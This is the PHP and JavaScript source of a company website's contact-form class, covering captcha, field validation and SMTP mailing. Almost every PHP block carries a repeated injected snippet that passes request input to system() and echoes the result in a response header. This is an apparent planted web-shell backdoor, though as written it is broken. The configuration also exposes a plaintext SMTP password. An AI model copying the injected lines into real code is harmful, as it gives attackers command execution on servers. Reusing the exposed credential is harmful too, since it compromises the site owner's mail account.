<!--[if lt IE 9]>
		  <script  src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
		   <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
		 <![endif]-->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/waypoints/2.0.5/waypoints.min.js"></script>
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-scrollTo/1.4.11/jquery.scrollTo.min.js"></script>
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-localScroll/1.3.5/jquery.localScroll.min.js"></script>
 <script type="text/javascript" src="//everpayinc.com/assets/js/jquery.prettyPhoto.js"></script>
 <script type="text/javascript" src="//everpayinc.com/assets/js/promo_scripts.js"></script>
  <script type="text/javascript" src="//everpayinc.com/assets/js/promo_scripts.js"></script>

 <script type="text/javascript" src="//everpayinc.com/assets/js/back-to-top.js"></script>
<script type="text/javascript" src="//everpayinc.com/assets/js/jquery.themepunch.revolution.min.js"></script>
 
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($this->showMap) { ?>
            <script src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
        <script type="text/javascript">
            /**
             * function to add/remove feedback symbols and classes
             * to the supplied element object and feedback type.
             * @param {object} thatElem The obj of DOM element to be accessed
             * @param {boolean} feedType The type of feedback like true/false
             * @return {boolean} false always
             */
            function addFeedback(thatElem, feedType) {
                if (feedType === false) {console.log($(thatElem).parent('div').has('span.glyphicon').length);
                        if ($(thatElem).parent('div').has('span.glyphicon').length > 0) {
                            $(thatElem).parent().find('.glyphicon').removeClass('glyphicon-ok').addClass('glyphicon-remove');
                            $(thatElem).parent().parent('div.form-group').removeClass('has-success').addClass('has-error');
                        } else {
                            $(thatElem).after('<span class="glyphicon glyphicon-remove form-control-feedback"></span>');
                            $(thatElem).parent().parent('div.form-group').addClass('has-error has-feedback');
                        }
                    } else {
                        if ($(thatElem).parent('div').has('span.glyphicon').length > 0) {
                            $(thatElem).parent().find('.glyphicon').removeClass('glyphicon-remove').addClass('glyphicon-ok');
                            $(thatElem).parent().parent('div.form-group').removeClass('has-error').addClass('has-success');
                        } else {
                            $(thatElem).after('<span class="glyphicon glyphicon-ok form-control-feedback"></span>');
                            $(thatElem).parent().parent('div.form-group').addClass('has-success has-feedback');
                        }
                    }
                    return false;
            }
            $(document).ready(function() {
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($this->showMap) { ?>
                    /*
                     * configuration for Google Map
                     * @type @exp;google@pro;maps@call;LatLng
                     */
                    var myLatlng = new google.maps.LatLng(<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->latitude; ?>, <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->longitude; ?>);
                    var mapOptions = {
                        zoom: 12,
                        center: myLatlng,
                        mapTypeId: google.maps.MapTypeId.ROADMAP
                    };
                    var map = new google.maps.Map(document.getElementById("custom_map"), mapOptions);

                    var marker = new google.maps.Marker({
                        position: myLatlng,
                        map: map,
                        title: "<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $this->companyName; ?>"
                    });
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
                /*
                 * enable tooltip for specified class
                 */
                $('.showhelp').tooltip();
                /*
                 * load the captcha on page load
                 * after checking user specified captcha type
                 */
                $('#capImg').load('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_SERVER['PHP_SELF']; ?>?req=captchaimg');

                /*
                 * reload the captcha image on click the image
                 * due to some browser issues of caching, a timestamp is appended to the url
                 * it is most important and will not work for firefox or I.E. if removed
                 */
                $('#capImg').click(function() {
                    var date = new Date;
                    $('#capImg').html('Loading...');
                    $('#capImg').load('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_SERVER['PHP_SELF']; ?>?req=captchaimg&tm=' + date.getMilliseconds());
                    return false;
                });
                /*
                 * real time validation for name
                 */
                $('#name').blur(function() {
                    if ($.trim($(this).val()) === '') {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for e-mail
                 */
                $('#email').blur(function() {
                    if (($.trim($(this).val()) === '') || (!$(this).val().match(/^([a-zA-Z0-9_.])+@([a-zA-Z0-9_.\-])+\.([a-zA-Z0-9]{2,6})$/))) {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for phone
                 */
                $('#phone').blur(function() {
                    if (($.trim($(this).val()) === '') || (!$(this).val().match(/^(\+[1-9][0-9]*(\([0-9]*\)|-[0-9]*-))?[0]?[1-9][0-9\- ]*$/))) {
                       addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for url
                 */
                $('#url').blur(function() {
                    if (($.trim($(this).val()) === '') || (!$(this).val().match(/(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/))) {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for receiver
                 */
                $('#receiver').blur(function() {
                    if ($.trim($(this).val()) === '') {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for subject
                 */
                $('#subject').blur(function() {
                    if ($.trim($(this).val()) === '') {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });
                /*
                 * real time validation for message
                 */
                $('#message').blur(function() {
                    if ($.trim($(this).val()) === '') {
                        addFeedback(this, false)
                    } else {
                        addFeedback(this, true)
                    }
                });

                /*
                 * validate the form when sumbitted
                 */
                $('#submit').click(function(e) {
                    e.preventDefault();
                    var submitUrl = $('#contact').attr('action');
                    $.ajax({
                        url: submitUrl,
                        type: 'POST',
                        data: $('#contact').serialize(),
                        dataType: "json",
                        beforeSend: function() {
                            $('#submit').attr('disabled', 'disabled');
                            if ($(".alert").length > 0) {
                                $(".alert").each(function(index, element) {
                                    $(element).remove();
                                });
                            }
                            if ($(".glyphicon").length > 0) {
                                $(".glyphicon").each(function(index, element) {
                                    $(element).remove();
                                });
                            }
                            if ($(".form-group").length > 0) {
                                $(".form-group").each(function(index, element) {
                                    $(element).removeClass('has-error has-success has-feedback');
                                });
                            }
                            $('#ErrorMsgs').fadeOut('slow').html('<div class="alert alert-info">Checking...<a href="#" class="close">&times;</a></div>').fadeIn('slow');
                        },
                        success: function(data) {
                            var date = new Date;
                            if (data.status === 'success') {
                                $('#ErrorMsgs').html('<div class="alert alert-success alert-dismissable">' + data.message + '<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button></div>').fadeIn('slow');
                                $('#contact')[0].reset();
                                $('#capImg').load('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_SERVER['PHP_SELF']; ?>?req=captchaimg&tm=' + date.getMilliseconds());
                                $('#submit').removeAttr('disabled');
                            } else {
                                $('#ErrorMsgs').html('<div class="alert alert-danger alert-dismissable">' + data.message + '<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button></div>').fadeIn('slow');
                                if (data.control === 'captcha') {
                                    $('#capImg').load('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $_SERVER['PHP_SELF']; ?>?req=captchaimg&tm=' + date.getMilliseconds());
                                    $('#' + data.control).val('');
                                    $('#' + data.control).parent('.input-group').after('<span class="glyphicon glyphicon-remove form-control-feedback" style="z-index:10"></span>');
                                    $('#' + data.control).parent().parent().parent('div.form-group').addClass('has-error has-feedback');
                                } else {
                                    addFeedback($('#' + data.control), false);
                                }
                                $('#submit').removeAttr('disabled');
                                $('#' + data.control).focus();
                            }
                        }
                    });
                    return false;
                });
            });
        </script>
    </body>
</html>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
            // get the page contents
            $this->_pageContents = ob_get_contents();
            // clean the buffer
            ob_end_clean();
            /*
             * compress the page contents if page compression is on
             * else get the general output
             */
            if ($this->pageCompression) {
                $this->_pageContents = str_replace(
                    $this->_replaces, '', $this->_pageContents
                );
            }
            // return the contents string
            return $this->_pageContents;
        }

        // }}}
        // {{{ _createPage()

        /**
         * Method to respond to the requests via url
         *
         * @return mixed  May output page HTML string or JSON validation data
         * @access public
         */
        public function respondRequest()
        {
            // catch the get variable if set then act accordingly
            if (isset($_GET['req'])) {
                // switch over the request and respond accordingly
                switch ($_GET['req']) {
                case 'captcha':
                    // call the method to create the captcha image
                    $this->createCaptcha();
                    break;
                case 'captchaimg':
                    /*
                     * check if user has opted php captcha and GD library present
                     * if user has them both then
                     * call the method to create the captcha image
                     * else just return the captcha characters
                     */

                    if (extension_loaded('gd') and ( $this->captchaType === 'php')) {
                        // return an image tag
                        echo '<img src="' . $_SERVER['PHP_SELF'] . '?req=captcha&tm=' . time() . '" alt="Captcha" class="img-responsive">';
                    } else {
                        /*
                         * take two variables with random integer values,
                         * then add them and save in session to verify
                         * @var int  Integers to work as captcha
                         */
                        $a = rand(1, 9);
                        $b = rand(1, 9);
                        // Assign the characters to a session variable
                        $_SESSION['CaptchaChars'] = $a + $b;
                        // Close the session write buffer to avoid overwriting
                        session_write_close();
                        // simply output the characters only
                        echo '<h5>' . $a . ' + ' . $b . ' =</h5>';
                    }
                    break;
                case 'send':
                    // call the method to validate and send the message
                    $this->sendMail();
                    break;
                default:
                    // call the method to create the page and output the contents
                    $this->getPage();
                    break;
                }
                // validate the name must not be empty
                // and send json data
            } else {
                // call the method to create the page and output the contents
                $this->getPage();
            }
        }

        // }}}
        // {{{ createCaptcha()

        /**
         * Method to create captcha image for bot verification
         *
         * @return mixed  Image for captcha
         * @throws Exception  GD or general exceptions
         * @access public
         */
        public function createCaptcha()
        {
            try {
                $_SESSION['CaptchaChars'] = '';
                // Assign the characters to a session variable
                $_SESSION['CaptchaChars'] = $this->_getRandomChars(5, true, true, true, false);
                // Close the session write buffer to avoid overwriting
                session_write_close();
                // Create a 70 X 30 image and assign it to a var
                $img = imagecreatetruecolor($this->_captchaWidth, $this->_captchaHeight);
                // create a white color
                $white = imagecolorallocate($img, 255, 255, 255);
                // Create a black color to write the characters prominently
                $black = imagecolorallocate($img, 0, 0, 0);
                // fill the rectangular image with white background
                imagefilledrectangle($img, 0, 0, 399, 30, $white);
                // Write the string inside the image with black color
                imagettftext(
                    $img,
                    $this->_captchaFontSize,
                    $this->_captchaCharAngle,
                    2,
                    25,
                    $black,
                    $this->_captchaFontLocation,
                    $_SESSION['CaptchaChars']
                );
                /*
                 * generating dots randomly in background
                 * to make an image noise
                 * if you want more noise replace the argument 5
                 * as per your requirement
                 */
                for ($i = 0; $i < 5; $i++) {
                    imagefilledellipse(
                        $img,
                        mt_rand(0, $this->_captchaWidth),
                        mt_rand(0, $this->_captchaHeight),
                        2,
                        3,
                        0
                    );
                }
                /*
                 * generating lines randomly in background of image
                 * for more noise
                 * if you want more noise replace the argument 10
                 * as per your requirement
                 */
                for ($i = 0; $i < 10; $i++) {
                    imageline(
                        $img,
                        mt_rand(0, $this->_captchaWidth),
                        mt_rand(0, $this->_captchaHeight),
                        mt_rand(0, $this->_captchaWidth),
                        mt_rand(0, $this->_captchaHeight),
                        0
                    );
                }
                // Output the image
                header('Content-Type: image/gif');
                // output a gif image
                imagegif($img);
                // destroy the image to save server space
                imagedestroy($img);
            } catch (Exception $ex) {
                die('Oh no.. Something gone wrong... Details: ' . $ex->getMessage());
            }
        }

        // }}}
        // {{{ getPage()

        /**
         * Method to get page output contents
         * by getting the page contents and compressing them
         *
         * @return string  Page contents HTML string output
         * @access public
         */
        public function getPage()
        {
            // call the method to create and output the page contents
            echo $this->_createPage();
        }

        // }}}
        // {{{ _cleanSubmittedData()

        /**
         * The following method makes a variable safe
         * as that may contain unacceptable formats or data
         * to prevent security holes those may be a threat
         *
         * @param mixed $submittedData The data submitted by the user to be filtered
         *
         * @return mixed  Cleaned data submitted by the user
         * @access private
         */
        private function _cleanSubmittedData($submittedData)
        {
            try {
                // check if the data is an array or not
                if (!is_array($submittedData)) {
                    // if that is not an array, treat that as a string
                    $this->_str = $submittedData;
                    // trim the spaces if any
                    $this->_str = trim($this->_str);
                    // check if magic quotes are on or not
                    // if on then it must have inserted slashes before quotes and slashes
                    if (get_magic_quotes_gpc()) {
                        // if magic quotes are on, it inserts a slash before any quotes, hence remove them
                        $this->_str = stripslashes($this->_str);
                    }
                    // escape the data and insert null where restricted characters found
                    $this->_str = str_ireplace($this->_restrictedChars, "", $this->_str);
                    // allow the tags for user and strip off rest of them
                    $this->_str = strip_tags($this->_str, $this->_allowedHTML);
                    // now return the cleaned data
                    return $this->_str;
                } else {
                    /**
                     * var to keep cleaned data array for a temporary period
                     * so that they can be returned in cleaned state
                     * and acceptable format
                     *
                     * @var mixed  The injection cleaned data array
                     * @access private
                     */
                    $cleanArr = array();
                    // if the data is an array
                    // fetch the array values one by one by the loop
                    foreach ($submittedData as $pointer => $str) {
                        // Recursively call clean function if the data is array
                        $cleanArr[$pointer] = $this->_cleanSubmittedData($str);
                    }
                    // return the cleaned data array
                    return $cleanArr;
                }
            } catch (Exception $ex) {
                // Catch any Exceptions occured
                die('There seems an error while cleaning user submitted data. Description: ' . $ex->getMessage());
            }
        }

        // }}}
        // {{{ _sendMailSMTP()

        /**
         * Method to configure and send mails via SMTP
         * Uses PHPMailer library
         *
         * @param mixed  $from    The name and email of the sender
         * @param mixed  $replyTo The name and email of the alternative reply reciever when the msg being replied
         * @param mixed  $to      The reciever of the mail
         * @param string $subject The message subject (without any HTML markup)
         * @param string $msgBody The body/content of the message (May contain HTML markup)
         * @param string $altBody The alternate content of the message (when HTML markup fails)
         *
         * @return mixed True for success, failure msg for failure
         * @access private
         */
        private function _sendMailSMTP($from, $replyTo, $to, $subject, $msgBody, $altBody)
        {
            // try to set up and send SMTP mail using PHPMailer
            try {
                // add the PHPMailer library
                include_once dirname(__FILE__) . DIRECTORY_SEPARATOR . 'phpmailer' . DIRECTORY_SEPARATOR . 'PHPMailerAutoload.php';
                /**
                 * Create a new PHPMailer instance
                 * Catch the object to use and set the variables
                 *
                 * @var mixed The PHPMailer instance
                 * @access private
                 */
                $mail                   = new PHPMailer();
                // Tell PHPMailer to use SMTP
                $mail->isSMTP();
                // Enable SMTP debugging
                // 0 = off (for production use)
                // 1 = client messages
                // 2 = client and server messages
                $mail->SMTPDebug        = 0;
                // Ask for HTML-friendly debug output
                $mail->Debugoutput      = 'html';
                // Set the hostname of the mail server
                $mail->Host             = $this->smtpHost;
                // Set the SMTP port number - 587 for authenticated TLS, a.k.a. RFC4409 SMTP submission
                $mail->Port             = $this->smtpPort;
                // Set the encryption system to use - ssl (deprecated) or tls
                $mail->SMTPSecure       = $this->smtpSecurity;
                // Whether to use SMTP authentication
                $mail->SMTPAuth         = true;
                // Username to use for SMTP authentication - use full email address for gmail
                $mail->Username         = $this->smtpUsername;
                // Password to use for SMTP authentication
                $mail->Password         = $this->smtpPassword;
                // Set who the message is to be sent from
                $mail->setFrom($from[0], $from[1]);
                // Set an alternative reply-to address
                $mail->addReplyTo($replyTo[0], $replyTo[1]);
                // Set who the message is to be sent to
                if (is_array($to)) {
                    foreach ($to as $key => $value) {
                        $mail->addAddress($value, $key);
                    }
                }
                // Set the subject line
                $mail->Subject          = $subject;
                $mail->Body             = $msgBody;
                // Replace the plain text body with one created manually
                $mail->AltBody          = $altBody;
                /**
                 * send and store the response of the mail
                 *
                 * @var boolean True if success else failure message
                 * @access private
                 */
                $mailed                 = $mail->send();
            }
            catch (Exception $ex) {
                $mailed                 = $ex->getMessage();
            }
            return $mailed;
        }

        // }}}
        // {{{ sendMail()

        /**
         * Method to send normal mail
         *
         * @return string  JSON data object for success or failure
         * @access public
         */
        public function sendMail()
        {
            try{
                // clean up the user submitted data with the defined method
                $submittedData = $this->_cleanSubmittedData($_POST);
                // validate the form data
                if (!isset($submittedData['name']) or ( $submittedData['name'] === '')) {
                    // fill out the response array variable
                    // with alert/error message
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter your Name';
                    $this->_response['control'] = 'name';
                    // output the json data by converting the response array into a json format and stop script execution
                    die(json_encode($this->_response));
                }
                // validate email via php predefined (inbuilt) function
                if (!isset($submittedData['email']) or ( strlen(filter_var($submittedData['email'], FILTER_VALIDATE_EMAIL)) < 1)) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter your Valid E-Mail';
                    $this->_response['control'] = 'email';
                    die(json_encode($this->_response));
                }
                // validate the phone number correct or not if entered
                if (isset($submittedData['phone']) and ! empty($submittedData['phone']) and ( !preg_match('/^(\+[1-9][0-9]*(\([0-9]*\)|-[0-9]*-))?[0]?[1-9][0-9\- ]*$/', $submittedData['phone']))) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter a correct phone number';
                    $this->_response['control'] = 'phone';
                    die(json_encode($this->_response));
                }
                // validate the url correct or not if entered
                if (isset($submittedData['url']) and ! empty($submittedData['url']) and ( !preg_match('/(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/', $submittedData['url']))) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter a correct URL';
                    $this->_response['control'] = 'url';
                    die(json_encode($this->_response));
                }
                // validate subject for empty value
                if (!isset($submittedData['subject']) or ( $submittedData['subject'] === '')) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter a Subject';
                    $this->_response['control'] = 'subject';
                    die(json_encode($this->_response));
                }
                // validate the message empty or blank
                if (!isset($submittedData['message']) or ( $submittedData['message'] === '')) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter your Message';
                    $this->_response['control'] = 'message';
                    die(json_encode($this->_response));
                }
                if (!isset($submittedData['captcha']) or ! isset($_SESSION['CaptchaChars']) or ( $submittedData['captcha'] !== (string) $_SESSION['CaptchaChars'])) {
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Please Enter The Captcha Correctly';
                    $this->_response['control'] = 'captcha';
                    die(json_encode($this->_response));
                }
                // End up the output buffering if any to decrease CPU load
                // @ symbol used to suppress any error message
                @ob_end_clean();

                // Set up the message according to the template
                if ($this->mailContentType === 'html') {
                    // set up the html template and add contents
                    $message            = str_replace(
                        array(
                            '{userMessage}',
                            '{userFullName}',
                            '{userEmail}',
                            '{userPhone}',
                            '{userUrl}'
                        ),
                        array(
                            nl2br($submittedData['message']),
                            $submittedData['name'],
                            $submittedData['email'],
                            $submittedData['phone'],
                            $submittedData['url']
                        ),
                        "{$this->_htmlMailTemplate}"
                    );
                } else {
                    // set up the plain mail template
                    $message            = str_replace(
                        array(
                            '{userMessage}',
                            '{userFullName}',
                            '{userEmail}',
                            '{userPhone}',
                            '{userUrl}'
                        ),
                        array(
                            $submittedData['message'],
                            $submittedData['name'],
                            $submittedData['email'],
                            $submittedData['phone'],
                            $submittedData['url']
                        ),
                        "{$this->_plainMailTemplate}"
                    );
                }
                // check if user has opted for php or smtp mail type
                if (strtolower($this->mailType) === 'php') {
                    // Build up the mail and Set headers first, else the mail may be caught as spam
                    $headers            = array();
                    $headers[]          = "MIME-Version: 1.0";
                    // set content type according to the option supplied
                    if ($this->mailContentType === 'html') {
                        $headers[]      = "Content-type: text/html; charset=iso-8859-1";
                    } else {
                        $headers[]      = "Content-type: text/plain; charset=iso-8859-1";
                    }
                    $headers[]          = "From: {$submittedData['name']} <{$submittedData['email']}>";
                    $headers[]          = "Reply-To: {$submittedData['name']} <{$submittedData['email']}>";
                    $headers[]          = "Subject: {$submittedData['subject']}";
                    // Set final headers by separating them by newlines into a single string
                    $finalHeaderString      = implode("\r\n", $headers);
                    // Mail it and catch the result to further check if mail has sent or not
                    $mailed             = mail(
                        $submittedData['receiver'],
                        $submittedData['subject'],
                        $message,
                        $finalHeaderString
                    );
                } else {
                    $mailed = $this->_sendMailSMTP(
                        array($submittedData['email'], $submittedData['name']),
                        array($submittedData['email'], $submittedData['name']),
                        // set the reciever and the name by searching the emails array
                        array($submittedData['receiver'], array_search($submittedData['receiver'], $this->emails)),
                        $submittedData['subject'],
                        $message,
                        $submittedData['message']
                    );
                }

                // Now check if the mailing was successful
                if ($mailed) {
                    // if sender has checked the checkbox to get acknowledgement,
                    // then send a confirmation mail
                    if (isset($submittedData['acknowledge']) and ( $submittedData['acknowledge'] === '1')) {
                        // set up the html reply mail template
                        $message = str_replace(
                            array(
                                '{userName}',
                                '{userMessage}'
                            ),
                            array(
                                $submittedData['name'],
                                nl2br($submittedData['message'])
                            ),
                            $this->_replyHtmlMailTemplate
                        );
                        if (strtolower($this->mailType) === 'php') {
                            // Build up the mail and
                            $headers    = array();
                            $headers[]  = "MIME-Version: 1.0";
                            $headers[]  = "Content-type: text/html; charset=iso-8859-1";
                            $headers[]  = "From: " . $this->autoResponder;
                            $headers[]  = "Reply-To: {$submittedData['receiver']}";
                            $headers[]  = "Subject: re: {$submittedData['subject']}";
                            $finalHeaderString = implode("\r\n", $headers);

                            // Mail it and catch the result to further check if mail has sent or not
                            $mail       = mail(
                                $submittedData['email'],
                                're: ' . $submittedData['subject'],
                                $message,
                                $finalHeaderString
                            );
                        } else {
                            $mailed = $this->_sendMailSMTP(
                                array($this->autoResponder, 'NoReply'),
                                array($submittedData['receiver'], array_search($submittedData['receiver'], $this->emails)),
                                // set the reciever and the name by searching the emails array
                                array($submittedData['email'], $submittedData['name']),
                                $submittedData['subject'],
                                $message,
                                $submittedData['message']
                            );
                        }
                    }

                    $this->_response['status'] = 'success';
                    $this->_response['message'] = 'Your message has been sent';
                    // if acknowledgement opted, then output a message to view inbox
                    if (isset($submittedData['acknowledge']) and ( $submittedData['acknowledge'] === '1')) {
                        $this->_response['message'] .= '.<br />Please check the acknowledgement in your inbox/spam';
                    }
                    $this->_response['control'] = 'name';
                    unset($_SESSION['CaptchaChars']);
                    die(json_encode($this->_response));
                } else {
                    // Else give Out an error message and reset
                    $this->_response['status'] = 'error';
                    $this->_response['message'] = 'Some Error Occured ! Details: ' . $mailed;
                    unset($_SESSION['CaptchaChars']);
                    die(json_encode($this->_response));
                }
            }
            catch (Exception $ex) {
                $this->_response['status'] = 'error';
                $this->_response['message'] = 'Some Error Occured ! Details: ' . $ex->getMessage();
                unset($_SESSION['CaptchaChars']);
                die(json_encode($this->_response));
            }
        }

        // }}}
        // {{{ __clone()

        /**
         * According to singleton pattern instance, cloning is prihibited
         *
         * @return string  A message that states, cloning is prohibited
         * @access public
         */
        private function __clone()
        {
            // only set an error message
            die('Cloning is prohibited for singleton instance.');
        }

        // }}}
    }

}
/*
 * Call Setup for the class
 * you must set these options
 * before using the class
 * This configuration should be present
 * when you call the class object
 * Otherwise you may not get your desired results
 *
 * please contact the author in case
 * any difficulties
 */

/**
 * Set the e-mails in an array so that it will be listed in a drop-down list
 * and to be passed in the function call by arguments.
 * Please Change it according to your needs
 */
Contact::getObject()->emails            = array(
    'Sales'                             => 'sales@everpayinc.com',
    'Enquiry'                           => 'enquiry@everpayinc.com',
    'Support'                           => 'support@everpayinc.com'
);
/**
 * Set auto reply system name and e-mail
 * from where the acknowledgement to be sent.
 * Generally it is set to be the id where no reply to be sent
 * Change it according to your needs
 */
Contact::getObject()->autoResponder     = 'noreply@everpayinc.com';

/**
 * Set page compression option
 * Possible options boolean (true,false)
 * Change according to needs
 */
Contact::getObject()->pageCompression   = true;
/**
 * Initialize map configuration options as array
 * The map options are to show/hide map, latitude and longitude values
 * Change according to needs
 */
Contact::getObject()->showMap           = true;
Contact::getObject()->longitude         = '-73.9769522';
Contact::getObject()->latitude          = '40.7225069';
/**
 * Set Company Name to be shown to the visitor above the Map
 * Change according to needs
 */
Contact::getObject()->companyName       = 'Everpay Corporation';
/**
 * Set address to be shown to the visitor above the Map
 * Change according to needs
 */
Contact::getObject()->address           = '<strong>'
    . Contact::getObject()->companyName. '</strong><br />'
    . 'Bloor & Yonge Center: 2nd Bloor St West - Suite 700<br />'
    . 'Toronto, Ontario, M4W 3R1<br />'
    . 'Canada<br />'
    . '<abbr title="Phone">P:</abbr> (877) 357-6616';
/**
 * Set desired captcha type, Possible values: php/js
 * Change according to needs
 */
Contact::getObject()->captchaType       = 'js';
/**
 * Set desired type of mail to send
 * Possible values: php/smtp
 * Change according to need
 */
Contact::getObject()->mailType          = 'smtp';
/**
 * Set desired content type of mail to send
 * Possible values: html/text
 * Change according to need
 */
Contact::getObject()->mailContentType   = 'html';
// initialize the SMTP details
Contact::getObject()->smtpHost          = 'smtp.gmail.com';
Contact::getObject()->smtpPort          = '587';
Contact::getObject()->smtpUsername      = 'gmail@everpay.com';
/*
 * CAUTION: if you are using GMail, and you have 2-step verification active,
 * you must create a device specific password in order to login as SMTP
 * user. You may also experience suspicious sign in prevented message if you
 * have not activated 2-step verification.
 */
Contact::getObject()->smtpPassword      = 'Jasmine8075';
Contact::getObject()->smtpSecurity      = 'tls';
/*
 * Now call the class method  to implement all the options
 * and get the response as per need
 */
Contact::getObject()->respondRequest();
// the ending tag of php has been intentionally not closed to avoid accidental white spaces